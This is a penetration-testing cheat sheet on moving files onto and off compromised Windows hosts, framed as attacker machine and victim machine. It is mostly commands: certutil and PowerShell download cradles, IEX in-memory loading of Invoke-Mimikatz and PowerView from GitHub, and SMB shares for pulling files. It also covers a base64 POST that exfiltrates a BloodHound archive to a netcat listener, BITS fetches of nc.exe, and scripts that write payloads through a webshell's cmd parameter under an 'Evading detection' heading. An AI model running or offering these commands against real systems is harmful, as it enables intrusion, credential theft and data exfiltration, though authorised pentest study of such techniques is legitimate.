# Windows File Transfer

## certutil.exe

Certutil is like the Linux wget. However, the Antimalware Scan Interface (AMSI) currently detects this as a malicious use of certutil.

```shell
# The -urlcache is optional, it is to see the status of the download:
certutil -urlcache -verifyctl -f -split http://<IP>:<PORT>/<FILE> <RENAME FILE>
# Copy&Paste Base64
certutil -encode <FILE> payload.b64
certutil -decode payload.b64 <RENAME FILE>
```

### References

* [https://lolbas-project.github.io/lolbas/Binaries/Certutil/](https://lolbas-project.github.io/lolbas/Binaries/Certutil/)

## smbserver.py

{% tabs %}
{% tab title="Method 1" %}
### Method 1 (shared resource without authentication)

```shell
# We go to the directory we want to share:
smbserver.py smbFolder $(pwd)
smbserver.py smbFolder $(pwd) -smb2support # For Windows 10 support.
dir \\<IP>\smbFolder # Check if the files are displayed. If not, try method 2 below.
copy \\<IP>\smbFolder\<FILE> <PATH>\<FILE> # Attacking machine -> Victim machine
copy \path\to\file \\<IP>\smbFolder\<RENAME FILE> # Victim machine -> Attacking machine
```
{% endtab %}

{% tab title="Method 2" %}
### Method 2 (shared resource with authentication)

```shell
# We go to the directory we want to share:
smbserver.py smbFolder $(pwd) -username levi -password levi123
smbserver.py smbFolder $(pwd) -username levi -password levi123 -smb2support # For Windows 10 support.
# There are 2 ways to authenticate here.
# We can create a logical drive or simply authenticate with the share:

# 1st form (without creating the logical unit):
net use \\<IP>\smbFolder /u:levi levi123 # To list the contents, we do: dir \\<IP>\smbFolder
copy \\<IP>\smbFolder\<FILE> <PATH>\<FILE> # Attacker machine -> Victim machine
copy <FILE> \\<IP>\smbFolder\<RENAME FILE> # Victim machine -> Attacker machine

# 2nd form (creating the logical unit):
net use x: \\<IP>\smbFolder /u:levi levi123 # To list the contents, we do: dir x:\
copy x:\<FILE> <PATH>/<RENAME FILE> # Attacker machine -> Victim machine
copy <FILE> x:\<RENAME FILE> # Victim machine -> Attacker machine
net use /delete x: # To delete the logical unit we created.
```

{% hint style="danger" %}
If there are still problems, try to open the server again but with a different name, i.e. change the name "**smbFolder**" to another one, and the same with the **username** and **password**.
{% endhint %}
{% endtab %}

{% tab title="Method 3" %}
### Method 3 (with logical unit in PS)

```shell
# We go to the directory we want to share:
smbserver.py smbFolder $(pwd)
smbserver.py smbFolder $(pwd) -smb2support # For Windows 10 support.
# On the victim machine, we execute:
New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\<LHOST>\smbFolder" # The "SharedFolder" is just a logical name for the attacking machine, it can be any.
dir SharedFolder:\ # Show shared files.
copy SharedFolder:\<FILE> <PATH>\<RENAME FILE> # Upload file
copy <PATH_TO_FILE> SharedFolder:\<RENAME FILE> # Download file.
```


{% endtab %}

{% tab title="Others" %}
### Logical disks

We can create a logical drive in Windows and mount the C disk by providing the credentials:

```bash
net use x: \\localhost\c$ /user:<USERNAME> <PASSWORD>
x:
```
{% endtab %}
{% endtabs %}

## PowerShell

{% tabs %}
{% tab title="Integrated functions" %}
### Powershell 1

```bash
# With output to the Internet (in real environments):
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
# No Internet access:
(New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<PATH>\<FILE>')
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>', '<PATH>\<RENAME FILE>')" # MS-DOS
```

### PowerShell Cmdlet (Powershell 3.0 and higher)

```bash
# With output to the Internet (in real environments):
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
# No Internet access:
Invoke-WebRequest "http://<IP>:<PORT>/<FILE>" -OutFile "<PATH>\<FILE>"
IWR -Uri "<URL>" -OutFile "<PATH>\<FILE>" # Abbreviated form.
Invoke-RestMethod http://<IP>/<FILE> -OutFile "<PATH>\<FILE>" # Test
```

### Base64 encoding

```powershell
# We convert the content to base64 and send a web request to our IP
# with the encoded content:
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
# Listening to nc on port 443 (nc -nvlp 443).
# Finally, we transfer the encoded content through a web request:
Invoke-WebRequest -Uri http://<IP>:443 -Method POST -Body $b64 # Form 1
Invoke-RestMethod -Uri http://<IP>:443 -Method POST -Body $b64 # Form 2 (Test)
# After receiving the content, we decode it:
echo <base64> | base64 -d -w 0 > bloodhound.zip
```

### Others

Powershell download cradles that do not observe the Internet Explorer first run check can also be used. Harmj0y has compiled an extensive list of PowerShell dump cribs [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). It is worth familiarizing yourself with them and their individual nuances, such as not observing a proxy or touching a disk to select the appropriate one for the situation.

### Troubleshooting

There may be cases where the configuration of the first start of Internet Explorer has not been completed, preventing the download:

![](../../.gitbook/assets/iwr\_download\_error.png)

This can be omitted with the `-UseBasicParsing` parameter:

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
```

Alternatively, with administrative access to the machine, we can disable the customization of Internet Explorer's First run:

```shell
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```
{% endtab %}

{% tab title="In memory" %}
### In memory

Also, instead of downloading it to disk, we can run the payload in memory with IEX:

{% hint style="warning" %}
It is recommended to use single quotes. For some strange reason, double quotes sometimes do not work.
{% endhint %}

```powershell
# With output to the Internet (in real environments):
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
# No Internet access:
IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
IEX (IWR "http://<IP>:<PORT>/<FILE>") # Test
# Piping the output of Invoke-WebRequest:
Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
```

{% hint style="danger" %}
If you get the following error: **The response content cannot be parsed because the Internet Explorer engine is not available**.... what we can do is to add a parameter to the IWR: `IWR -Uri "<URL>" -UseBasicParsing`
{% endhint %}


{% endtab %}

{% tab title="BITS" %}
```powershell
# MS-DOS and PowerShell:
bitsadmin /transfer n http://<IP>/nc.exe C:\Temp\nc.exe
# PowerShell:
Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```



a

a

a

a

a
{% endtab %}

{% tab title="Evading detection" %}
### Base64 method

We can transfer a file by encoding it in base64 and decoding it on the receiving computer:

{% hint style="warning" %}
It is recommended to use this method if a firewall is active. It is not stealthy.
{% endhint %}

#### Method via webshell

```shell
pwsh
$fileContent = Get-Content -Raw <FILE>
$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
$encode = [Convert]::ToBase64String($bytes)
$encode | Out-File <FILE>.b64 # Save the base64 to a file.
```

If we are executing the RCE through a webshell by means of a GET request, then we must encode the "**+**" and "**=**" in URL format. For that, we can do it in 2 ways:

```powershell
# Method #1:
php --interactive
print urlencode("<BASE64>");
# Method #2:
sed -i 's/=/%3D/g' <FILE>.b64
sed -i 's/+/%2b/g' <FILE>.b64
```

If it is by POST, simply in the script that we are going to make next, it will be to add the parameter `--data-urlencode` for `cURL`.

As we are going to do it in parts, we are going to divide it in 80 characters, each line:

```bash
fold <FILE>.b64 > <FILE>.splitb64
```

And now yes, we upload with **curl**, in parts the content of base64 to a file:

{% code title="upload_via_get.sh" %}
```bash
#!/bin/bash

for line in $(cat <FILE>.splitb64); do
	command="echo ${line} >> C:\Windows\Temp\<FILE>.b64"
	curl -s -X GET "http://<IP>/shell.php?cmd=$command"
done
```
{% endcode %}

{% code title="upload_via_post.sh" %}
```bash
#!/bin/bash

for line in $(cat <FILE>.splitb64); do
	command="echo ${line} >> C:\Windows\Temp\<FILE>.b64"
	curl -s -X POST "http://<IP>/shell.php" --data-urlencode "<PARAM>=$command"
done
```
{% endcode %}

Ready, now through the RCE (through the webshell), we are going to export this file in its original state:

{% hint style="info" %}
It is recommended to type the following commands in one line.
{% endhint %}

```powershell
$fileContent = Get-Content C:\Windows\Temp\<FILE>.b64
$decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($fileContent))
$decode > C:\Windows\Temp\<FILE>
# Oneliner format:
powershell -c <1_COMMAND>; <2_COMMAND>; <3_COMMAND>
```
{% endtab %}
{% endtabs %}





